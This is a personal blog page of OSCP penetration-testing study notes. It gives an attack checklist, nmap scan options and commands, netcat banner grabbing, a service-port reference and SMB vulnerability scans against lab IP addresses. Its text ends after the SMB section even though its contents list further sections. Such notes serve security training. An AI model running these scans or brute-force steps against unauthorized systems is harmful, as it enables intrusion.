
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../..">
      
      
        <link rel="next" href="../Note%202/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Note 1 - Jacky's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#ultimate-guide" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Jacky&#39;s Blog" class="md-header__button md-logo" aria-label="Jacky's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Jacky's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Note 1
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Jacky&#39;s Blog" class="md-nav__button md-logo" aria-label="Jacky's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Jacky's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    whoami
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    OSCP notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            OSCP notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Note 1
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Note 1
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ultimate-guide" class="md-nav__link">
    <span class="md-ellipsis">
      Ultimate Guide
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#easy-win" class="md-nav__link">
    <span class="md-ellipsis">
      Easy win
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner Grabbing
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detail-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Detail Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-quick-check" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Quick Check
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#host-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Host Discovery
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#multi-threaded-python-port-scanner" class="md-nav__link">
    <span class="md-ellipsis">
      Multi-threaded Python Port Scanner
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-servervhost-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      DNS server/vhost discovery
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gobuster-ffuf-and-dnsrecon" class="md-nav__link">
    <span class="md-ellipsis">
      Gobuster, FFUF and dnsrecon
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-check" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory Check
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Check">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-smbrpc" class="md-nav__link">
    <span class="md-ellipsis">
      Check smb/rpc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-nmap-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Check nmap scripts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-ldapsearch" class="md-nav__link">
    <span class="md-ellipsis">
      Check ldapsearch
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-ldap-with-nmap-and-enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      Check ldap with nmap and enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerbrutecmercecheck-other-common-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Kerbrute/CME/RCE/Check other common exploits
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chiselpivoting" class="md-nav__link">
    <span class="md-ellipsis">
      Chisel/Pivoting
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dump-password" class="md-nav__link">
    <span class="md-ellipsis">
      Dump password
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#evil-winrm" class="md-nav__link">
    <span class="md-ellipsis">
      Evil winrm
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nse-scripts-scan" class="md-nav__link">
    <span class="md-ellipsis">
      NSE Scripts Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linpeaspspy64" class="md-nav__link">
    <span class="md-ellipsis">
      Linpeas/pspy64
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#burp-suite" class="md-nav__link">
    <span class="md-ellipsis">
      Burp Suite
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#usb" class="md-nav__link">
    <span class="md-ellipsis">
      USB
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-knocking" class="md-nav__link">
    <span class="md-ellipsis">
      Port Knocking
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Force
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Brute Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#johntheripper-and-cewl" class="md-nav__link">
    <span class="md-ellipsis">
      Johntheripper and cewl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hydra-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Hydra brute force
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#online-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Online tools
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#upgrade-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Upgrade shell
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flags" class="md-nav__link">
    <span class="md-ellipsis">
      Flags
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Note%202/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Note 2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Projects
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Projects
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Projects/LaTeX%20Math%20Support/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LaTeX Math Support
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Projects/Mermaid%20Diagrams/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mermaid diagrams
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Projects/Text%20Formatting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Text Formatting
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Splunk notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Splunk notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Splunk_notes/Note%201/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Note 1
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../blog/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Archive
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ultimate-guide" class="md-nav__link">
    <span class="md-ellipsis">
      Ultimate Guide
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#easy-win" class="md-nav__link">
    <span class="md-ellipsis">
      Easy win
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner Grabbing
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detail-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Detail Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-quick-check" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Quick Check
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#host-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Host Discovery
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#multi-threaded-python-port-scanner" class="md-nav__link">
    <span class="md-ellipsis">
      Multi-threaded Python Port Scanner
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-servervhost-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      DNS server/vhost discovery
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gobuster-ffuf-and-dnsrecon" class="md-nav__link">
    <span class="md-ellipsis">
      Gobuster, FFUF and dnsrecon
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-check" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory Check
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Check">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-smbrpc" class="md-nav__link">
    <span class="md-ellipsis">
      Check smb/rpc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-nmap-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Check nmap scripts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-ldapsearch" class="md-nav__link">
    <span class="md-ellipsis">
      Check ldapsearch
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-ldap-with-nmap-and-enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      Check ldap with nmap and enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerbrutecmercecheck-other-common-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Kerbrute/CME/RCE/Check other common exploits
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chiselpivoting" class="md-nav__link">
    <span class="md-ellipsis">
      Chisel/Pivoting
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dump-password" class="md-nav__link">
    <span class="md-ellipsis">
      Dump password
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#evil-winrm" class="md-nav__link">
    <span class="md-ellipsis">
      Evil winrm
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nse-scripts-scan" class="md-nav__link">
    <span class="md-ellipsis">
      NSE Scripts Scan
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linpeaspspy64" class="md-nav__link">
    <span class="md-ellipsis">
      Linpeas/pspy64
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#burp-suite" class="md-nav__link">
    <span class="md-ellipsis">
      Burp Suite
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#usb" class="md-nav__link">
    <span class="md-ellipsis">
      USB
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-knocking" class="md-nav__link">
    <span class="md-ellipsis">
      Port Knocking
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Force
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Brute Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#johntheripper-and-cewl" class="md-nav__link">
    <span class="md-ellipsis">
      Johntheripper and cewl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hydra-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Hydra brute force
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#online-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Online tools
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#upgrade-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Upgrade shell
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flags" class="md-nav__link">
    <span class="md-ellipsis">
      Flags
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Note 1</h1>

<h2 id="ultimate-guide">Ultimate Guide<a class="headerlink" href="#ultimate-guide" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> <br/>
<a href="https://book.hacktricks.xyz/">Hacktricks</a> <br/>
<a href="https://gtfobins.github.io/">GTFOBins</a> <br/>
<a href="https://wadcoms.github.io/">WADComs</a> <br/></p>
<h2 id="easy-win">Easy win<a class="headerlink" href="#easy-win" title="Permanent link">&para;</a></h2>
<p>nmap scan <br/>
hydra ssh/ftp/rdp etc protocols<br/>
burp/wireshark<br/>
service report(enum4linux, Nikto, snmpwalk, dirbuster, onesixtyone, gobuster, vhost)<br/>
msf modules<br/>
log in anonymous (ftp, smb guess session)<br/>
PUT or POST files to ports<br/>
PHP &lt; 5.3<br/>
SQL running<br/>
SQL injection (JSON?not json? blind sql?)<br/>
Weak login? Bypass?<br/>
LFI/RFI?<br/>
Cookies? (bypass login? rce?)<br/>
Create wordlists for brute force (cewl)<br/>
Searchsploit?<br/></p>
<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
<p>Options:<br/>
-sT connect scan<br/>
-sU UDP scan<br/>
-sS TCP SYN scan<br/>
-sn network sweep<br/>
-sC default script<br/>
-sV version detection of services<br/>
-A Enable OS detection, version detection, script scanning, and traceroute<br/>
-O OS Fingerprint<br/>
-p- scans all TCP ports<br/>
-Pn SOMETIMES causes FALSE POSITIVE, skip the initial stage that checks if the host is up<br/>
-oG saves the output and uses grep to filter the results to only show lines that contain the word "open" in the "Ports" field </p>
<h2 id="banner-grabbing">Banner Grabbing<a class="headerlink" href="#banner-grabbing" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-vn<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>Port
</code></pre></div>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-21---ftp">Port 21 - FTP</a><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-22---ssh">Port 22 - SSH</a><br/>
- Port 23 - Telnet<br/>
    - transfer data in plain text<br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-53---dns">Port 53 - DNS</a><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-79---finger">Port 79 - Finger</a><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-80443---https">Port 80/443 - HTTP(S)</a><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-110---pop3">Port 110 - POP3</a><br/>
    - <strong>SMTP sends the email from the sender's device to the receiver's mailbox, and POP3 retrieves and organizes emails from the receiver's mail server to the receiver's computer</strong><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-139445---smb">Port 139/445 - SMB</a><br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-161---snmp">Port 161 - SNMP</a><br/>
    - used for <strong>communication between routers, switches, firewalls, load balancers, servers, CCTV cameras, and wireless devices</strong>.<br/>
- <a href="https://www.noobsec.net/oscp-cheatsheet/#port-2049---nfs">Port 2049 - NFS</a><br/>
    - allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally<br/>
- Port 135, 593 - MSRPC<br/>
- Port 25, 465(SSL), 587(SSL) - SMTP<br/>
    - protocol utilized within the TCP/IP suite for the <strong>sending and receiving of e-mail</strong><br/>
- Port 389,636,3269 - LDAP<br/>
    - LDAP is a protocol that many different directory services and access management solutions can understand.<br/>
- Port 5432, 5433 - Postgresql<br/>
- Port 1433 - MSSQL <br/>
- Port 3306 - MYSQL<br/>
- Port 6379 - Redis<br/>
    - a fast, open-source, in-memory key-value data structure store.<br/>
    - session cache<br/>
    - (FPC) Full Page Cache<br/>
- Port 3389 - RDP<br/>
    - graphical interface connection between computers over a network.<br/></p>
<h2 id="initial-scan">Initial Scan<a class="headerlink" href="#initial-scan" title="Permanent link">&para;</a></h2>
<p>nmap -sC -sV -oA nmap/initial (ip address) <br/>
(default script)(version detection of services)(output to nmap initial) </p>
<h2 id="detail-scan">Detail Scan<a class="headerlink" href="#detail-scan" title="Permanent link">&para;</a></h2>
<p>nmap --script all -sC -sV -O -o fulltcpnmap -A -T4 -p- 10.129.77.60 (detail) <br/>
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3(detail) <br/>
enum4linux <br/>
nmap -A -sV -sU -sC -p- -o fulludpnmap 10.10.10.xxx <br/>
udp scan </p>
<h2 id="smb-quick-check">SMB Quick Check<a class="headerlink" href="#smb-quick-check" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60
</code></pre></div>
